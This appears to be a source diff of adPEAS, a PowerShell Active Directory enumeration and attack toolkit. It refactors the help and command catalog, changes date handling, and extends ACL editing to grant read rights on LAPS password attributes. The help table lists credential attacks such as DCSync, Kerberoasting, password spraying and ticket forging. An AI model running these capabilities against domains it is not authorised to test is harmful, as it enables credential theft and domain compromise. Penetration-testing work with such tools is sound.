     $Json = [regex]::Replace($Json, '(?:"(?<key>[^"\\]+)":\s*)?"\\/Date\((?<ms>-?\d+)(?:[+-]\d{4})?\)\\/"', {
         param($match)
-        $instant = $epoch.AddMilliseconds([double]$match.Groups['ms'].Value)
+        $date = [DateTime]::FromFileTime(116444736000000000L + ([long]$match.Groups['ms'].Value * 10000L))
         $key = $match.Groups['key'].Value
-        $date = if ($key -and $utcAttributes -and $utcAttributes.Contains($key)) { $instant } else { $instant.ToLocalTime() }
         $prefix = if ($key) { '"' + $key + '":' } else { '' }
         $prefix + '"' + $date.ToString('o', [System.Globalization.CultureInfo]::InvariantCulture) + '"'
     })
@@ -25552,12 +25781,192 @@ function Show-NoParametersError {
     $hints = @("For more information, run: Get-Help $FunctionName -Examples")
     Show-Message -Type Error -Title "${FunctionName}: No modification parameters specified" -Hints $hints
 }
-function Get-adPEASHelp {
-    [CmdletBinding()]
-    param(
-        [ValidateSet('QuickStart','Checks','Commands')]
-        [string[]]$Section
+$Script:adPEASHelpCommands = [ordered]@{
+    'Connection' = @(
+        @{ Name = 'Connect-adPEAS';        Text = 'Establish LDAP session' }
+        @{ Name = 'Disconnect-adPEAS';     Text = 'Close LDAP session' }
+        @{ Name = 'Get-adPEASSession';     Text = 'Show session status' }
+        @{ Name = 'Build-CompletionCache'; Text = 'Tab completion for AD object names' }
     )
+    'AD Queries' = @(
+        @{ Name = 'Get-DomainUser';           Text = 'Query AD users' }
+        @{ Name = 'Get-DomainComputer';       Text = 'Query AD computers' }
+        @{ Name = 'Get-DomainGroup';          Text = 'Query AD groups' }
+        @{ Name = 'Get-DomainGPO';            Text = 'Query Group Policy Objects' }
+        @{ Name = 'Get-DomainObject';         Text = 'Query any AD object' }
+        @{ Name = 'Get-ObjectACL';            Text = 'Query object ACLs' }
+        @{ Name = 'Get-DomainWriteAccess';    Text = 'What an account may write in the directory' }
+        @{ Name = 'Get-CertificateTemplate';  Text = 'Query certificate templates' }
+        @{ Name = 'Get-CertificateAuthority'; Text = 'Query certificate authorities' }
+        @{ Name = 'Get-DomainDNSZone';        Text = 'Query AD-integrated DNS zones' }
+        @{ Name = 'Get-DomainDNSRecord';      Text = 'Query AD-integrated DNS records' }
+        @{ Name = 'Get-GPOLinkage';           Text = 'Which OUs, domains and sites link which GPOs' }
+        @{ Name = 'Get-LAPSGPOConfig';        Text = 'LAPS settings out of the Group Policy Objects' }
+    )
+    'AD Modifications' = @(
+        @{ Name = 'Set-DomainUser';          Text = 'Modify user attributes' }
+        @{ Name = 'Set-DomainComputer';      Text = 'Modify computer attributes' }
+        @{ Name = 'Set-DomainGroup';         Text = 'Modify group attributes' }
+        @{ Name = 'Set-DomainObject';        Text = 'Modify any AD object' }
+        @{ Name = 'Set-DomainGPO';           Text = 'Modify Group Policy Objects' }
+        @{ Name = 'Set-CertificateTemplate'; Text = 'Modify certificate templates' }
+        @{ Name = 'New-DomainUser';          Text = 'Create AD user' }
+        @{ Name = 'New-DomainComputer';      Text = 'Create AD computer' }
+        @{ Name = 'New-DomainGroup';         Text = 'Create AD group' }
+        @{ Name = 'New-DomainGPO';           Text = 'Create Group Policy Object' }
+        @{ Name = 'Move-DomainObject';       Text = 'Move or rename any AD object' }
+    )
+    'Kerberos Authentication' = @(
+        @{ Name = 'Invoke-KerberosAuth';   Text = 'Request TGT (Password/Hash/Key/Cert)' }
+        @{ Name = 'Request-ServiceTicket'; Text = 'Request TGS for a service' }
+        @{ Name = 'Import-KerberosTicket'; Text = 'Pass-the-Ticket (inject into session)' }
+    )
+    'Credential Attacks' = @(
+        @{ Name = 'Invoke-Kerberoast';    Text = 'Kerberoasting (request service tickets)' }
+        @{ Name = 'Invoke-ASREPRoast';    Text = 'AS-REP Roasting (no preauth)' }
+        @{ Name = 'Invoke-DCSync';        Text = 'DCSync (directory replication)' }
+        @{ Name = 'Invoke-PasswordSpray'; Text = 'Password, NT-hash and computer default password spraying' }
+        @{ Name = 'Get-Hash';             Text = 'Derive NT/AES/DES keys from a password' }
+    )
+    'Offensive Actions' = @(
+        @{ Name = 'Invoke-TicketForge';                  Text = 'Golden/Silver/Diamond Tickets' }
+        @{ Name = 'Invoke-ConstrainedDelegation';        Text = 'S4U attack via constrained delegation' }
+        @{ Name = 'Invoke-RBCD';                         Text = 'S4U attack via resource-based delegation' }
+        @{ Name = 'Invoke-S4U';                          Text = 'S4U2Self/S4U2Proxy from a secret or a TGT' }
+        @{ Name = 'Set-DomainComputer -AddRBCD';         Text = 'Configure resource-based delegation' }
+        @{ Name = 'Set-DomainUser -AddShadowCredential'; Text = 'Shadow Credentials' }
+        @{ Name = 'Request-ADCSCertificate';             Text = 'Request ADCS certificate' }
+    )
+    'Network' = @(
+        @{ Name = 'Invoke-PortScan'; Text = 'TCP connect scan of hosts, networks or the domain' }
+    )
+    'Decoding' = @(
+        @{ Name = 'ConvertFrom-SID';                   Text = 'SID to DOMAIN\name' }
+        @{ Name = 'ConvertFrom-GPPPassword';           Text = 'Decrypt a Group Policy Preferences cpassword' }
+        @{ Name = 'ConvertFrom-VBE';                   Text = 'Decode a VBScript Encoded (.vbe) file' }
+        @{ Name = 'ConvertFrom-LAPSEncryptedPassword'; Text = 'Parse or decrypt a Windows LAPS blob' }
+    )
+    'Reporting' = @(
+        @{ Name = 'Convert-adPEASReport'; Text = 'Rebuild HTML/text report from a JSON export' }
+        @{ Name = 'Compare-adPEASReport'; Text = 'Compare two JSON exports' }
+    )
+}
+function Get-adPEASCheckCatalog {
+    [CmdletBinding()]
+    param()
+    $scan = Get-Command -Name 'Invoke-adPEAS' -CommandType Function -ErrorAction SilentlyContinue
+    if (-not $scan) { return }
+    $scanAst = $scan.ScriptBlock.Ast
+    $moduleTitles = @{}
+    $assignment = $scanAst.Find({
+        param($node)
+        $node -is [System.Management.Automation.Language.AssignmentStatementAst] -and
+        $node.Left.Extent.Text -eq '$Script:ModuleCategoryHeaders'
+    }, $true)
+    if ($assignment) {
+        $table = $assignment.Find({ param($node) $node -is [System.Management.Automation.Language.HashtableAst] }, $true)
+        if ($table) {
+            try { $moduleTitles = $table.SafeGetValue() } catch {
+                Write-Log "[Get-adPEASCheckCatalog] Could not read the module titles: $_"
+            }
+        }
+    }
+    $seen = @{}
+    $calls = $scanAst.FindAll({
+        param($node)
+        $node -is [System.Management.Automation.Language.CommandAst] -and $node.GetCommandName() -eq 'Invoke-CheckWithContext'
+    }, $true)
+    foreach ($call in $calls) {
+        $arguments = Get-adPEASConstantArgument -CommandAst $call
+        $name = $arguments['CheckName']
+        if (-not $name -or $seen.ContainsKey($name)) { continue }
+        $seen[$name] = $true
+        $module = $arguments['Category']
+        [PSCustomObject]@{
+            Name        = $name
+            Module      = $module
+            ModuleTitle = $(if ($moduleTitles.ContainsKey($module)) { [string]$moduleTitles[$module] } else { $module })
+            Title       = $arguments['Title']
+            Summary     = Get-adPEASCheckSummary -Name $name
+        }
+    }
+}
+function Get-adPEASConstantArgument {
+    [CmdletBinding()]
+    param([Parameter(Mandatory = $true)] $CommandAst)
+    $arguments = @{}
+    $elements = $CommandAst.CommandElements
+    for ($i = 1; $i -lt $elements.Count - 1; $i++) {
+        if ($elements[$i] -is [System.Management.Automation.Language.CommandParameterAst] -and
+            $elements[$i + 1] -is [System.Management.Automation.Language.StringConstantExpressionAst]) {
+            $arguments[$elements[$i].ParameterName] = $elements[$i + 1].Value
+        }
+    }
+    return $arguments
+}
+function Get-adPEASCheckSummary {
+    [CmdletBinding()]
+    param([Parameter(Mandatory = $true)] [string]$Name)
+    $check = Get-Command -Name $Name -CommandType Function -ErrorAction SilentlyContinue
+    if (-not $check) { return $null }
+    $checkAst = $check.ScriptBlock.Ast
+    $subHeaders = $checkAst.FindAll({
+        param($node)
+        $node -is [System.Management.Automation.Language.CommandAst] -and $node.GetCommandName() -eq 'Show-SubHeader'
+    }, $true)
+    foreach ($subHeader in $subHeaders) {
+        $objectType = (Get-adPEASConstantArgument -CommandAst $subHeader)['ObjectType']
+        if ($objectType -and $Script:ObjectTypeDefinitions -and $Script:ObjectTypeDefinitions[$objectType] -and
+            $Script:ObjectTypeDefinitions[$objectType].Summary) {
+            return [string]$Script:ObjectTypeDefinitions[$objectType].Summary
+        }
+    }
+    $help = $checkAst.GetHelpContent()
+    if ($help -and $help.Synopsis) { return ($help.Synopsis -replace '\s+', ' ').Trim() }
+    return $null
+}
+function Get-adPEASHelp {
+    [CmdletBinding(DefaultParameterSetName = 'Section')]
+    param(
+        [Parameter(ParameterSetName = 'Section')]
+        [ValidateSet('QuickStart','Checks','Commands')]
+        [string[]]$Section,
+        [Parameter(Mandatory = $true, ParameterSetName = 'Search')]
+        [ValidateNotNullOrEmpty()]
+        [string]$Search
+    )
+    if ($PSCmdlet.ParameterSetName -eq 'Search') {
+        $pattern = if ($Search -match '[\*\?]') { $Search } else { '*' + [System.Management.Automation.WildcardPattern]::Escape($Search) + '*' }
+        $checkHits = @(Get-adPEASCheckCatalog | Where-Object {
+            $_.Name -like $pattern -or $_.Title -like $pattern -or $_.Module -like $pattern -or
+            $_.ModuleTitle -like $pattern -or $_.Summary -like $pattern
+        })
+        $commandHits = @(foreach ($category in $Script:adPEASHelpCommands.Keys) {
+            foreach ($entry in $Script:adPEASHelpCommands[$category]) {
+                if ($entry.Name -like $pattern -or $entry.Text -like $pattern -or $category -like $pattern) {
+                    [PSCustomObject]@{ Name = $entry.Name; Category = $category; Text = $entry.Text }
+                }
+            }
+        })
+        Show-SubHeader "adPEAS checks and commands matching '$Search'"
+        if ($checkHits.Count -gt 0) {
+            Show-Line "Checks - run in the scan, or alone by this name:" -Class Hint
+            foreach ($hit in $checkHits) {
+                $summary = if ($hit.Summary) { $hit.Summary } else { $hit.Title }
+                Show-KeyValue $hit.Name "[$($hit.Module)] $summary"
+            }
+            Show-EmptyLine
+        }
+        if ($commandHits.Count -gt 0) {
+            Show-Line "Commands:" -Class Hint
+            foreach ($hit in $commandHits) { Show-KeyValue $hit.Name "[$($hit.Category)] $($hit.Text)" }
+            Show-EmptyLine
+        }
+        if ($checkHits.Count + $commandHits.Count -eq 0) {
+            Show-Line "No check or command matches '$Search' - Get-adPEASHelp lists them all" -Class Note
+        }
+        return
+    }
     $showAll = -not $Section
     $showQuickStart = $showAll -or ($Section -contains 'QuickStart')
     $showChecks = $showAll -or ($Section -contains 'Checks')
@@ -25576,6 +25985,7 @@ function Get-adPEASHelp {
         Show-EmptyLine
         Show-Line "More help:" -Class Hint
         Show-Line "Get-adPEASHelp"
+        Show-Line "Get-adPEASHelp -Search <word>"
         Show-Line "Get-Help Connect-adPEAS -Examples"
         Show-Line "Get-Help <Command> -Detailed"
         Show-EmptyLine
@@ -25588,106 +25998,30 @@ function Get-adPEASHelp {
         Show-Line "Run specific modules only:" -Class Hint
         Show-Line "Invoke-adPEAS -Module 'Domain','Creds','ADCS'"
         Show-EmptyLine
-        $moduleOrder = [ordered]@{
-            'Domain'      = "Domain Configuration"
-            'Creds'       = "Credential Exposure"
-            'Rights'      = "Access Permissions"
-            'Delegation'  = "Delegation Settings"
-            'ADCS'        = "AD Certificate Services"
-            'Accounts'    = "Privileged Accounts"
-            'GPO'         = "Group Policy Objects"
-            'Computer'    = "Computer Security"
-            'Application' = "Application Infrastructure"
-            'Shares'      = "Shares"
-            'Bloodhound'  = "BloodHound Data"
-        }
-        $checksByModule = @{}
-        if ($Script:ObjectTypeDefinitions) {
-            foreach ($entry in $Script:ObjectTypeDefinitions.GetEnumerator()) {
-                $mod = $entry.Value.Module
-                if ($mod -and $moduleOrder.Contains($mod)) {
-                    if (-not $checksByModule[$mod]) { $checksByModule[$mod] = @() }
-                    $title = $entry.Value.SectionTitle
-                    $summary = $entry.Value.Summary
-                    if ($title -and ($checksByModule[$mod].Title -notcontains $title)) {
-                        $checksByModule[$mod] += @{ Title = $title; Summary = $summary }
-                    }
-                }
-            }
-        }
-        foreach ($mod in $moduleOrder.Keys) {
-            $desc = $moduleOrder[$mod]
-            Show-Line "$($desc): -Module $mod" -Class Hint
-            $checks = $checksByModule[$mod]
-            if ($checks) {
-                foreach ($check in $checks) {
-                    Show-KeyValue $check.Title $check.Summary
-                }
+        Show-Line "Run one check alone - by the name on its left:" -Class Hint
+        Show-Line "Get-ComputerInitialPassword -Domain 'contoso.com'"
+        Show-EmptyLine
+        $catalog = @(Get-adPEASCheckCatalog)
+        $modules = @($catalog | ForEach-Object { $_.Module } | Select-Object -Unique)
+        foreach ($module in $modules) {
+            $checks = @($catalog | Where-Object { $_.Module -eq $module })
+            Show-Line "$($checks[0].ModuleTitle): -Module $module" -Class Hint
+            foreach ($check in $checks) {
+                $summary = if ($check.Summary) { $check.Summary } else { $check.Title }
+                Show-KeyValue $check.Name $summary
             }
             Show-EmptyLine
         }
     }
     if ($showCommands) {
         Show-SubHeader "Additional Core and Helper Modules"
-        Show-Line "Connection:" -Class Hint
-        Show-KeyValue "Connect-adPEAS" "Establish LDAP session"
-        Show-KeyValue "Disconnect-adPEAS" "Close LDAP session"
-        Show-KeyValue "Get-adPEASSession" "Show session status"
-        Show-EmptyLine
-        Show-Line "AD Queries:" -Class Hint
-        Show-KeyValue "Get-DomainUser" "Query AD users"
-        Show-KeyValue "Get-DomainComputer" "Query AD computers"
-        Show-KeyValue "Get-DomainGroup" "Query AD groups"
-        Show-KeyValue "Get-DomainGPO" "Query Group Policy Objects"
-        Show-KeyValue "Get-DomainObject" "Query any AD object"
-        Show-KeyValue "Get-ObjectACL" "Query object ACLs"
-        Show-KeyValue "Get-DomainWriteAccess" "What an account may write in the directory"
-        Show-KeyValue "Get-CertificateTemplate" "Query certificate templates"
-        Show-KeyValue "Get-CertificateAuthority" "Query certificate authorities"
-        Show-KeyValue "Get-DomainDNSZone" "Query AD-integrated DNS zones"
-        Show-KeyValue "Get-DomainDNSRecord" "Query AD-integrated DNS records"
-        Show-EmptyLine
-        Show-Line "AD Modifications:" -Class Hint
-        Show-KeyValue "Set-DomainUser" "Modify user attributes"
-        Show-KeyValue "Set-DomainComputer" "Modify computer attributes"
-        Show-KeyValue "Set-DomainGroup" "Modify group attributes"
-        Show-KeyValue "Set-DomainObject" "Modify any AD object"
-        Show-KeyValue "Set-DomainGPO" "Modify Group Policy Objects"
-        Show-KeyValue "Set-CertificateTemplate" "Modify certificate templates"
-        Show-KeyValue "New-DomainUser" "Create AD user"
-        Show-KeyValue "New-DomainComputer" "Create AD computer"
-        Show-KeyValue "New-DomainGroup" "Create AD group"
-        Show-KeyValue "New-DomainGPO" "Create Group Policy Object"
-        Show-KeyValue "Move-DomainObject" "Move or rename any AD object"
-        Show-EmptyLine
-        Show-Line "Kerberos Authentication:" -Class Hint
-        Show-KeyValue "Invoke-KerberosAuth" "Request TGT (Password/Hash/Key/Cert)"
-        Show-KeyValue "Request-ServiceTicket" "Request TGS for a service"
-        Show-KeyValue "Import-KerberosTicket" "Pass-the-Ticket (inject into session)"
-        Show-EmptyLine
-        Show-Line "Credential Attacks:" -Class Hint
-        Show-KeyValue "Invoke-Kerberoast" "Kerberoasting (request service tickets)"
-        Show-KeyValue "Invoke-ASREPRoast" "AS-REP Roasting (no preauth)"
-        Show-KeyValue "Invoke-DCSync" "DCSync (directory replication)"
-        Show-KeyValue "Invoke-PasswordSpray" "Password spraying"
-        Show-KeyValue "Get-Hash" "Derive NT/AES/DES keys from a password"
-        Show-EmptyLine
-        Show-Line "Offensive Actions:" -Class Hint
-        Show-KeyValue "Invoke-TicketForge" "Golden/Silver/Diamond Tickets"
-        Show-KeyValue "Invoke-ConstrainedDelegation" "S4U attack via constrained delegation"
-        Show-KeyValue "Invoke-RBCD" "S4U attack via resource-based delegation"
-        Show-KeyValue "Invoke-S4U" "S4U2Self/S4U2Proxy from a secret or a TGT"
-        Show-KeyValue "Set-DomainComputer -AddRBCD" "Configure resource-based delegation"
-        Show-KeyValue "Set-DomainUser -AddShadowCredential" "Shadow Credentials"
-        Show-KeyValue "Request-ADCSCertificate" "Request ADCS certificate"
-        Show-EmptyLine
-        Show-Line "Network:" -Class Hint
-        Show-KeyValue "Invoke-PortScan" "TCP connect scan of hosts, networks or the domain"
-        Show-EmptyLine
-        Show-Line "Reporting:" -Class Hint
-        Show-KeyValue "Convert-adPEASReport" "Rebuild HTML/text report from a JSON export"
-        Show-KeyValue "Compare-adPEASReport" "Compare two JSON exports"
-        Show-EmptyLine
+        foreach ($category in $Script:adPEASHelpCommands.Keys) {
+            Show-Line "$($category):" -Class Hint
+            foreach ($entry in $Script:adPEASHelpCommands[$category]) {
+                Show-KeyValue $entry.Name $entry.Text
+            }
+            Show-EmptyLine
+        }
     }
 }
 function Get-AuthenticatedDirectoryEntry {
@@ -26217,7 +26551,7 @@ function ConvertFrom-KeyCredentialLink {
                             try {
                                 $FileTime = [BitConverter]::ToInt64($EntryData, 0)
                                 if ($FileTime -gt 0) {
-                                    $Result.KeyLastLogonTime = [DateTime]::FromFileTimeUtc($FileTime)
+                                    $Result.KeyLastLogonTime = [DateTime]::FromFileTime($FileTime)
                                 }
                             } catch { }
                         }
@@ -26227,7 +26561,7 @@ function ConvertFrom-KeyCredentialLink {
                             try {
                                 $FileTime = [BitConverter]::ToInt64($EntryData, 0)
                                 if ($FileTime -gt 0) {
-                                    $Result.KeyCreationTime = [DateTime]::FromFileTimeUtc($FileTime)
+                                    $Result.KeyCreationTime = [DateTime]::FromFileTime($FileTime)
                                 }
                             } catch { }
                         }
@@ -28801,6 +29135,8 @@ function Clear-SessionState {
     $Script:NTLMTokenHandle = [IntPtr]::Zero
     $Script:SchemaClassNameCache = $null
     $Script:WriteAccessSchemaCache = $null
+    $Script:BHPropertyGUIDs = $null
+    $Script:BHExtendedRightGUIDs = $null
     $Script:AnonymousAccessEnabled = $null
     $Script:AnonymousAccessDetails = $null
     $Script:AnonymousAccessTested = $null
@@ -29185,10 +29521,13 @@ function ConvertFrom-LDAPAttribute {
                     $entryIndex++
                     try {
                         $historyInfo = ConvertFrom-LAPSEncryptedPassword -Blob $historyBlob
+                        $historyDecryptor = Get-LAPSDecryptorName -Info $historyInfo
                         if ($historyInfo -and $historyInfo.UpdateTimestamp) {
-                            $historyEntries += "[$entryIndex] $(Format-adPEASDate $historyInfo.UpdateTimestamp 'yyyy-MM-dd HH:mm:ss')"
+                            $historyEntry = "[$entryIndex] $(Format-adPEASDate $historyInfo.UpdateTimestamp 'yyyy-MM-dd HH:mm:ss')"
+                            if ($historyDecryptor) { $historyEntry += " (for $historyDecryptor)" }
+                            $historyEntries += $historyEntry
                         } else {
-                            $historyEntries += "[$entryIndex] [Encrypted - $($historyBlob.Length) bytes]"
+                            $historyEntries += "[$entryIndex] $(Format-LAPSEncryptedValue -Info $historyInfo -Length $historyBlob.Length)"
                         }
                     } catch {
                         $historyEntries += "[$entryIndex] [Encrypted - $($historyBlob.Length) bytes]"
@@ -29572,11 +29911,7 @@ function ConvertFrom-LDAPAttribute {
                 } elseif ($PropName -ieq "msLAPS-EncryptedPassword") {
                     try {
                         $encryptedInfo = ConvertFrom-LAPSEncryptedPassword -Blob $PropValue[0]
-                        if ($encryptedInfo -and $encryptedInfo.UpdateTimestamp) {
-                            $ConvertedProperties[$PropName] = "[Encrypted - Updated: $(Format-adPEASDate $encryptedInfo.UpdateTimestamp 'yyyy-MM-dd HH:mm:ss')]"
-                        } else {
-                            $ConvertedProperties[$PropName] = "[Encrypted - $($PropValue[0].Length) bytes]"
-                        }
+                        $ConvertedProperties[$PropName] = Format-LAPSEncryptedValue -Info $encryptedInfo -Length $PropValue[0].Length
                     } catch {
                         $ConvertedProperties[$PropName] = "[Encrypted - $($PropValue[0].Length) bytes]"
                     }
@@ -29736,17 +30071,8 @@ function ConvertFrom-LDAPAttribute {
                     }
                 } elseif ($Script:LDAPGeneralizedTimeAttributes.Contains($PropNameLower)) {
                     try {
-                        $gtValue = [string]$PropValue[0]
-                        if ($gtValue -match '^(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})') {
-                            $dateTime = [DateTime]::new(
-                                [int]$Matches[1],
-                                [int]$Matches[2],
-                                [int]$Matches[3],
-                                [int]$Matches[4],
-                                [int]$Matches[5],
-                                [int]$Matches[6],
-                                [DateTimeKind]::Utc
-                            )
+                        $dateTime = ConvertFrom-adPEASGeneralizedTime $PropValue[0]
+                        if ($null -ne $dateTime) {
                             $ConvertedProperties[$PropName] = $dateTime
                         } else {
                             $ConvertedProperties[$PropName] = $PropValue[0]
@@ -29986,7 +30312,7 @@ function ConvertFrom-LDAPAttribute {
                             if ($LAPSObj.t) {
                                 try {
                                     $LAPSFileTime = [Convert]::ToInt64($LAPSObj.t, 16)
-                                    $ConvertedProperties['msLAPS-Updated'] = ([DateTime]::FromFileTimeUtc($LAPSFileTime))
+                                    $ConvertedProperties['msLAPS-Updated'] = ([DateTime]::FromFileTime($LAPSFileTime))
                                 } catch { }
                             }
                         } else {
@@ -32236,6 +32562,21 @@ function Set-DomainObject {
                         Write-Log "[Set-DomainObject] Set owner to: $Principal ($($PrincipalSID.Value))"
                     }
                 }
+                if ($PSCmdlet.ParameterSetName -in @('GrantACE', 'DenyACE') -and $ACEsAdded -eq 0) {
+                    Write-Log "[Set-DomainObject] No ACE was added - nothing committed"
+                    if ($PassThru) {
+                        return [PSCustomObject]@{
+                            Operation   = $PSCmdlet.ParameterSetName
+                            Object      = $ObjectDN
+                            Principal   = $Principal
+                            ACEsAdded   = 0
+                            ACEsRemoved = 0
+                            Success     = $false
+                            Message     = "No ACE was added on object: $ObjectDN"
+                        }
+                    }
+                    return $false
+                }
                 try {
                     $SDBytes = $ACL.GetSecurityDescriptorBinaryForm()
                     $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
@@ -32532,12 +32873,26 @@ function Add-ACEToACL {
     $AccessControlType = [System.Security.AccessControl.AccessControlType]::$AccessType
     if ($ExtendedRight) {
         $ReadPropertyGUID = $Script:ReadPropertyAliases[$ExtendedRight]
+        $readRights = [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty
+        if (-not $ReadPropertyGUID -and $Script:LAPSReadAliasAttributes.ContainsKey($ExtendedRight)) {
+            $lapsAlias = $Script:LAPSReadAliasAttributes[$ExtendedRight]
+            $lapsAttributeName = $lapsAlias.Attribute
+            $lapsSchema = Get-LAPSSchemaPresence
+            if ($lapsSchema -and $lapsSchema.AttributeGUIDs) { $ReadPropertyGUID = $lapsSchema.AttributeGUIDs[$lapsAttributeName] }
+            if (-not $ReadPropertyGUID) {
+                Write-Error "[Add-ACEToACL] '$ExtendedRight' needs the schemaIDGUID of $lapsAttributeName, which this forest's schema does not have or which could not be read"
+                return 0
+            }
+            if ($lapsAlias.Confidential) {
+                $readRights = [System.DirectoryServices.ActiveDirectoryRights]($readRights -bor [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight)
+            }
+        }
         if ($ReadPropertyGUID) {
-            Write-Log "[Add-ACEToACL] '$ExtendedRight' is a ReadProperty alias (attribute GUID: $ReadPropertyGUID)"
+            Write-Log "[Add-ACEToACL] '$ExtendedRight' is a ReadProperty alias (attribute GUID: $ReadPropertyGUID, rights: $readRights)"
             $ObjectType = New-Object Guid($ReadPropertyGUID)
             $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                 $PrincipalSID,
-                [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty,
+                $readRights,
                 $AccessControlType,
                 $ObjectType,
                 [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
@@ -41256,6 +41611,38 @@ function Format-adPEASDate {
     )
     return $Date.ToString($Format, [System.Globalization.CultureInfo]::InvariantCulture)
 }
+function ConvertFrom-adPEASGeneralizedTime {
+    [CmdletBinding()]
+    [OutputType([datetime])]
+    param(
+        [Parameter(Mandatory = $true, Position = 0)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        $Value
+    )
+    if ($null -eq $Value) { return $null }
+    if ($Value -is [byte[]]) { $Value = [System.Text.Encoding]::ASCII.GetString($Value) }
+    $text = [string]@($Value)[0]
+    if ($text -notmatch '^(\d{14})') { return $null }
+    $parsed = [DateTime]::MinValue
+    $styles = [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal
+    if (-not [DateTime]::TryParseExact($Matches[1], 'yyyyMMddHHmmss', [System.Globalization.CultureInfo]::InvariantCulture, $styles, [ref]$parsed)) {
+        return $null
+    }
+    return $parsed.ToLocalTime()
+}
+function Get-adPEASTimeZoneLabel {
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $false, Position = 0)]
+        [datetime]$At = (Get-Date)
+    )
+    $offset = [TimeZoneInfo]::Local.GetUtcOffset($At)
+    $sign = if ($offset -lt [TimeSpan]::Zero) { '-' } else { '+' }
+    $abs = $offset.Duration()
+    return ('UTC' + $sign + $abs.Hours.ToString('00', [System.Globalization.CultureInfo]::InvariantCulture) + ':' + $abs.Minutes.ToString('00', [System.Globalization.CultureInfo]::InvariantCulture))
+}
 function Get-adPEASOutputBasePath {
     [CmdletBinding()]
     [OutputType([string])]
@@ -43370,6 +43757,70 @@ function Test-IsExpectedInScope {
         return 'Finding'
     }
 }
+function Get-UnresolvedSIDState {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$SID,
+        [Parameter(Mandatory = $false)]
+        [hashtable]$ConnectionParams = @{}
+    )
+    $cleanSID = $SID.Trim()
+    if ($cleanSID -match '^(S-1-[0-9-]+)') { $cleanSID = $Matches[1] }
+    $result = [PSCustomObject]@{
+        SID        = $cleanSID
+        State      = 'Unknown'
+        Carrier    = $null
+        CarrierSID = $null
+    }
+    if ($cleanSID -notmatch '^S-1-5-21-\d+-\d+-\d+-\d+$') { return $result }
+    $ownDomainSID = $null
+    if ($Script:LDAPContext -and $Script:LDAPContext.DomainSID) { $ownDomainSID = [string]$Script:LDAPContext.DomainSID }
+    if (-not $ownDomainSID) { return $result }
+    if ($cleanSID.Substring(0, $cleanSID.LastIndexOf('-')) -ne $ownDomainSID) {
+        $result.State = 'Foreign'
+        return $result
+    }
+    try {
+        $sidObject = New-Object System.Security.Principal.SecurityIdentifier($cleanSID)
+        $sidBytes = New-Object byte[] $sidObject.BinaryLength
+        $sidObject.GetBinaryForm($sidBytes, 0)
+        $sidHex = ($sidBytes | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+        $present = @(Get-DomainObject -LDAPFilter "(objectSid=$sidHex)" -Properties 'distinguishedName' @ConnectionParams)
+        if ($present.Count -gt 0) {
+            $result.State = 'Present'
+            return $result
+        }
+        $carrier = @(Get-DomainObject -LDAPFilter "(sIDHistory=$sidHex)" -Properties 'objectSid', 'sAMAccountName', 'distinguishedName' @ConnectionParams)[0]
+        if ($carrier) {
+            $carrierSID = [string]$carrier.objectSid
+            $result.State = 'SIDHistory'
+            $result.CarrierSID = $carrierSID
+            $carrierName = $null
+            if ($carrierSID) { $carrierName = ConvertFrom-SID -SID $carrierSID }
+            if (-not $carrierName) { $carrierName = [string]$carrier.sAMAccountName }
+            if (-not $carrierName) { $carrierName = [string]$carrier.distinguishedName }
+            $result.Carrier = $carrierName
+            return $result
+        }
+    } catch {
+        Write-Log "[Get-UnresolvedSIDState] Lookup of $cleanSID failed: $_"
+        return $result
+    }
+    $boundIsPrivileged = $false
+    $boundName = $null
+    if ($Script:LDAPContext.AuthenticatedUserSAM) { $boundName = [string]$Script:LDAPContext.AuthenticatedUserSAM }
+    elseif ($Script:LDAPContext.AuthenticatedUserDN) { $boundName = [string]$Script:LDAPContext.AuthenticatedUserDN }
+    if ($boundName) {
+        try {
+            $boundIsPrivileged = ((Test-IsPrivileged -Identity $boundName).IsPrivileged -eq $true)
+        } catch {
+            Write-Log "[Get-UnresolvedSIDState] Privilege check for '$boundName' failed: $_"
+        }
+    }
+    $result.State = if ($boundIsPrivileged) { 'Deleted' } else { 'DeletedOrHidden' }
+    return $result
+}
 function Resolve-SchemaClassName {
     [CmdletBinding()]
     param(
@@ -44560,7 +45011,7 @@ function ConvertFrom-LAPSEncryptedPassword {
             } else {
                 Write-Log "[ConvertFrom-LAPSEncryptedPassword] Parsing 16-byte header (timestamp plausible: $timestampPlausible, size plausible: $sizePlausible)"
                 if ($timestampPlausible) {
-                    $updateTimestamp = [DateTime]::FromFileTimeUtc($headerFileTime)
+                    $updateTimestamp = [DateTime]::FromFileTime($headerFileTime)
                     Write-Log "[ConvertFrom-LAPSEncryptedPassword] Header timestamp: $updateTimestamp"
                 } else {
                     Write-Log "[ConvertFrom-LAPSEncryptedPassword] Header timestamp out of valid range: $headerFileTime (raw bytes: $($Blob[0..7] -join ','))"
@@ -44616,24 +45067,24 @@ function ConvertFrom-LAPSEncryptedPassword {
             if ($Decrypt) {
                 Write-Log "[ConvertFrom-LAPSEncryptedPassword] Attempting decryption via NCryptUnprotectSecret"
                 try {
+                    $attempts = @()
+                    if ($encryptedData -and $encryptedData.Length -ne $Blob.Length) {
+                        $attempts += @{ Label = 'CMS body'; Data = $encryptedData }
+                    }
+                    $attempts += @{ Label = 'full blob'; Data = $Blob }
                     $decryptedData = $null
-                    try {
-                        Write-Log "[ConvertFrom-LAPSEncryptedPassword] Trying full blob ($($Blob.Length) bytes)"
-                        $decryptedData = Invoke-NCryptUnprotectSecret -ProtectedBlob $Blob
-                    } catch {
-                        $fullError = $_.Exception.Message
-                        Write-Log "[ConvertFrom-LAPSEncryptedPassword] Full blob failed: $fullError"
-                        if ($encryptedData -and $encryptedData.Length -ne $Blob.Length) {
-                            try {
-                                Write-Log "[ConvertFrom-LAPSEncryptedPassword] Trying CMS-only ($($encryptedData.Length) bytes)"
-                                $decryptedData = Invoke-NCryptUnprotectSecret -ProtectedBlob $encryptedData
